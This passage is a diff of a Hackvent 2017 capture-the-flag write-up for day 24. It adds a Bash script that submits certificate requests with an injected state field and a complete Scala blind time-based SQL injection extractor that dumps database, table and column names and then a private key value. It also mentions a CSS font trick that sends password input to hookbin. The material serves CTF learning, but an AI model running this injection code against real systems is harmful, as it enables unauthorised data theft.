@@ -37,7 +37,7 @@ $ wget -O styles-original.css -q http://challenges.hackvent.hacking-lab.com:1087
 $ dos2unix -q styles-original.css
 ``` 
 
-Then I created my [modified](files/styles-pwned.css "styles-pwned.css") version with this Scala script:
+Then I created my [modified](files/styles-pwned.css "styles-pwned.css") version with this Scala [script](../../src/main/scala/hackvent2017/Day24.scala#L13 "Day24.scala"):
 
 ```scala
 val cssOriginal = Paths.get("hackvent2017/challenges/day24/files/styles-original.css")
@@ -76,7 +76,7 @@ It defines my own fictional `pwn` font family which uses hookbin to capture requ
 }
 ``` 
 
-In last step it adds this font family to the `password` HTML element.
+In last step it assigns this font family to the `password` HTML element.
 
 ```css
 #password {
@@ -100,7 +100,127 @@ The Message Board Admin Panel was running on port [1088](http://challenges.hackv
 
 This stage contained *Tools* section with a form which generated certificate based on submitted CRS.
 
-Hints 3 and 4 directed me to the `state` field of CSR which suffered from SQL injection. I wrote a script which used blind time-based SQLi on that field to find useful data in the underlying database. It was very time consuming part but I managed to extract link to the last stage from column `private_key` of the first row of table `hv24_2.keystorage`. It contained this value:
+Hints 3 and 4 directed me to the `state` field of CSR which suffered from SQL injection. 
+
+I prepared a Bash [script](files/generate-cert.sh "generate-cert.sh") to generate CSR with state field passed as its argument, submit it and get the result certificate.
+
+```bash
+#!/bin/bash
+
+if [ "$#" -eq 0 ]; then
+    echo "Usage: $0 STATE"
+    exit 1
+fi
+
+STATE="$@"
+
+openssl req -nodes -new -newkey rsa:2048 -sha256 -keyout /tmp/hv17-d24.key -out /tmp/hv17-d24.csr -subj "/C=GB/ST=$STATE/L=London/O=Hackvent/OU=1337/CN=1337.hackvent.com" &>/dev/null
+[ $? -eq 0 ] || exit $?
+
+CSR="$(cat /tmp/hv17-d24.csr)"
+curl -s \
+    -X POST "http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument=&key=E7g24fPcZgL5dg78" \
+    -H 'content-type: application/x-www-form-urlencoded' \
+    --data-urlencode "csr=$CSR" | sed 's/<br>/\n/g' > /tmp/hv17-d24.cert
+
+rm -f /tmp/hv17-d24.key
+rm -f /tmp/hv17-d24.cert
+rm -f /tmp/hv17-d24.csr
+```
+
+Then I wrote a Scala [script](../../src/main/scala/hackvent2017/Day24.scala#L42 "Day24.scala") on top of the script which used blind time-based SQLi on that field to find useful data in the underlying MySQL database. 
+
+```scala
+val idChars = ('a' to 'z') ++ ('0' to '9') :+ '$' :+ '_' // case insensitive
+val valueChars = ('a' to 'z') ++ ('A' to 'Z') ++ ('0' to '9') :+ '-' :+ '_' :+ ':' :+ '/' :+ '?' :+ '=' :+ '.' // case sensitive
+val sleep = 3
+
+/* -- database names extractor -- */
+
+def databaseNameStmtBuilder()(c: Char, pos: Int, offset: Int): String =
+  s"SELECT IF(substr(n,$pos,1)='$c',sleep($sleep),0)FROM(SELECT DISTINCT table_schema n FROM information_schema.tables LIMIT $offset,1)d";
+
+def extractDatabaseNames(): Seq[String] = extractValues(databaseNameStmtBuilder(), idChars)
+def extractDatabaseName(offset: Int): Option[String] = extractValue(databaseNameStmtBuilder(), idChars, offset)
+
+/* -- table names extractor -- */
+
+def tableNamesStmtBuilder(db: String)(c: Char, pos: Int, offset: Int): String =
+  s"SELECT IF(substr(table_name,$pos,1)='$c',sleep($sleep),0)FROM information_schema.tables WHERE table_schema='$db'LIMIT $offset,1"
+
+def extractTableNames(db: String): Seq[String] = extractValues(tableNamesStmtBuilder(db), idChars)
+def extractTableName(db: String, offset: Int): Option[String] = extractValue(tableNamesStmtBuilder(db), idChars, offset)
+
+/* -- column names extractor -- */
+
+// query was too long to fit into CSR state field so the database name had to be removed from the where clause
+def columnNameStmtBuilder(db: String, table: String)(c: Char, pos: Int, offset: Int): String =
+  s"SELECT IF(substr(column_name,$pos,1)='$c',sleep($sleep),0)FROM information_schema.columns WHERE table_name='$table'LIMIT $offset,1"
+
+def extractColumnNames(db: String, table: String): Seq[String] = extractValues(columnNameStmtBuilder(db, table), idChars)
+def extractColumnName(db: String, table: String, offset: Int): Option[String] = extractValue(columnNameStmtBuilder(db, table), idChars, offset)
+
+/* -- column values extractor -- */
+
+def columnValueStmtBuilder(db: String, table: String, column: String)(c: Char, pos: Int, offset: Int): String =
+  s"SELECT IF(BINARY substr($column,$pos,1)='$c',sleep($sleep),0)FROM $db.$table LIMIT $offset,1"
+
+def extractColumnValues(db: String, table: String, column: String): Seq[String] = extractValues(columnValueStmtBuilder(db, table, column), valueChars)
+def extractColumnValue(db: String, table: String, column: String, offset: Int): Option[String] = extractValue(columnValueStmtBuilder(db, table, column), valueChars, offset)
+
+/* -- common extractor -- */
+
+def extractValues(builder: (Char, Int, Int) => String, alphabet: Seq[Char]): Seq[String] = {
+  val values = ListBuffer[String]()
+
+  var offset = 0
+  var found = false
+  do {
+    val value = extractValue(builder, alphabet, offset)
+    if (value.isDefined) values += value.get
+    found = value.isDefined
+    offset += 1
+  } while (found)
+
+  values.toList
+}
+
+def extractValue(builder: (Char, Int, Int) => String, alphabet: Seq[Char], offset: Int): Option[String] = {
+  val value = new StringBuilder()
+
+  var end = false
+  while (!end) {
+    var found = false
+    for (c <- alphabet) {
+      if (!found) {
+        if (checkSQL(builder(c, value.length+1, offset), sleep)) {
+          value.append(c)
+          found = true
+          print(c)
+        }
+      }
+    }
+    end = !found
+  }
+  if (value.nonEmpty) println(s"\rfound: $value")
+
+  if (value.nonEmpty) Some(value.toString) else None
+}
+
+def checkSQL(statement: String, sleep: Int) = time(() => generateCert(s"'OR($statement)OR'")) >= sleep
+
+def generateCert(state: String) = {
+  val retcode = s"hackvent2017/challenges/day24/files/generate-cert.sh $state".!
+  if (retcode != 0) throw new RuntimeException(s"Unexpected result code: $retcode")
+}
+
+val db = "hv24_2" // <-- extractDatabaseNames(): List(hv24_2, information_schema, mysql, performance_schema)
+val table = "keystorage" // <-- extractTableNames(db): List(certificates, keystorage)
+val column = "private_key" // <-- extractColumnNames(db, table): List(private_key)
+val value = "challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw" // <-- extractColumnValue(db, table, column, 0)
+```
+
+It was very time consuming part but I managed to extract link to the last stage from column `private_key` of the first row of table `hv24_2.keystorage`. It contained this value:
 
 ```
 challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw
